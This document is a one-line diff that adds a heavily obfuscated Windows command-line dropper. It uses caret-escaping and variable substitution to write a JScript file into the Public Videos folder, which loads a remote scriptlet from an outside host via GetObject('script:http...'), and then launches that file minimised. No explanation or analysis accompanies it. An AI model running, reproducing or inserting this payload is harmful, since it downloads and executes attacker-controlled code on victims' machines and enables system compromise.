@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "se^T ADV=^еж^зи^й╗&&se^T HPL=%Public%\V^id^eos\^rIu3Mi9i&&S^e^t AZWDZ=tr^y^{^vWhS52car c='sc^ri^pt^:';d='hWhS52cTt^P:';GWhS52cet^Ob^jWhS52cec^t(c+d+'&&se^T KMPT=wajm57wajm57p3qmrz.helpdeskcorp.netwajm57?1wajm57');}c^a^tch^(e^){^}^;&&se^T/^p HAZC="!AZWDZ:WhS52c=!!KMPT:wajm57=/!"<n^ul > !HPL!.^j^S|ca^l^l s^t^a^rt !HPL!.j^S "|c^M^d
